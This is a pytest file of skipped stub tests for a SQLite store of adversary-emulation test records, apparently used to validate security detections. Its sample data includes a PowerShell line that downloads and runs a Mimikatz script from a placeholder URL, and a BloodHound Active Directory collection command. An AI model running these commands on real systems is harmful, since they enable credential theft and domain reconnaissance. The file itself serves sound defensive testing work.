"""
Wave 0 TDD stubs for Phase 40 AtomicsStore.
P40-T01: DDL, bulk_insert, atomic_count, idempotent seed, validation persistence.
All stubs SKIP RED until Plan 02 implements AtomicsStore.
"""
from __future__ import annotations
import sqlite3
import pytest

pytestmark = pytest.mark.unit

try:
    from backend.services.atomics.atomics_store import AtomicsStore, seed_atomics
    _AVAILABLE = True
except ImportError:
    _AVAILABLE = False

def _make_conn() -> sqlite3.Connection:
    conn = sqlite3.connect(":memory:", check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

SAMPLE_TESTS = [
    {
        "technique_id": "T1059.001",
        "display_name": "Command and Scripting Interpreter: PowerShell",
        "test_number": 1,
        "test_name": "Mimikatz",
        "auto_generated_guid": "f7e6ec05-c19e-4a80-b7c9-7ac9b58b1c16",
        "description": "Test description.",
        "supported_platforms": '["windows"]',
        "executor_name": "command_prompt",
        "elevation_required": 0,
        "command": "powershell.exe \"IEX (New-Object Net.Webclient).DownloadString('#{mimurl}')\"",
        "cleanup_command": "",
        "prereq_command": "",
        "input_arguments": '{"mimurl": {"description": "Mimikatz URL", "type": "url", "default": "https://example.com/mimi.ps1"}}',
    },
    {
        "technique_id": "T1059.001",
        "display_name": "Command and Scripting Interpreter: PowerShell",
        "test_number": 2,
        "test_name": "Run Bloodhound",
        "auto_generated_guid": "a2b3c4d5-e6f7-8901-abcd-ef0123456789",
        "description": "Runs Bloodhound collector.",
        "supported_platforms": '["windows"]',
        "executor_name": "powershell",
        "elevation_required": 0,
        "command": "Invoke-BloodHound -CollectionMethod All",
        "cleanup_command": "Remove-Item BloodHound.zip -Force",
        "prereq_command": "",
        "input_arguments": "{}",
    },
]

@pytest.mark.skipif(not _AVAILABLE, reason="Wave 0 stub — AtomicsStore not yet implemented")
def test_atomics_tables_exist():
    """AtomicsStore(conn) DDL creates both atomics + atomics_validation_results tables."""
    conn = _make_conn()
    _store = AtomicsStore(conn)
    tables = [r[0] for r in conn.execute("SELECT name FROM sqlite_master WHERE type='table'").fetchall()]
    assert "atomics" in tables
    assert "atomics_validation_results" in tables

@pytest.mark.skipif(not _AVAILABLE, reason="Wave 0 stub — AtomicsStore not yet implemented")
def test_bulk_insert():
    """bulk_insert(list) populates atomics table; atomic_count() returns correct count."""
    conn = _make_conn()
    store = AtomicsStore(conn)
    store.bulk_insert(SAMPLE_TESTS)
    assert store.atomic_count() == len(SAMPLE_TESTS)

@pytest.mark.skipif(not _AVAILABLE, reason="Wave 0 stub — AtomicsStore not yet implemented")
def test_bulk_insert_idempotent():
    """bulk_insert twice does not duplicate rows (INSERT OR IGNORE)."""
    conn = _make_conn()
    store = AtomicsStore(conn)
    store.bulk_insert(SAMPLE_TESTS)
    store.bulk_insert(SAMPLE_TESTS)
    assert store.atomic_count() == len(SAMPLE_TESTS)

@pytest.mark.skipif(not _AVAILABLE, reason="Wave 0 stub — AtomicsStore not yet implemented")
def test_list_techniques():
    """list_techniques() returns distinct technique_id + display_name pairs ordered by technique_id."""
    conn = _make_conn()
    store = AtomicsStore(conn)
    store.bulk_insert(SAMPLE_TESTS)
    techniques = store.list_techniques()
    assert len(techniques) == 1
    assert techniques[0]["technique_id"] == "T1059.001"

@pytest.mark.skipif(not _AVAILABLE, reason="Wave 0 stub — AtomicsStore not yet implemented")
def test_validation_persistence():
    """save_validation_result persists verdict; get_validation_results retrieves it."""
    conn = _make_conn()
    store = AtomicsStore(conn)
    store.bulk_insert(SAMPLE_TESTS)
    store.save_validation_result("T1059.001", 1, "pass", "det-abc123")
    results = store.get_validation_results()
    assert ("T1059.001", 1) in results
    assert results[("T1059.001", 1)]["verdict"] == "pass"
    assert results[("T1059.001", 1)]["detection_id"] == "det-abc123"
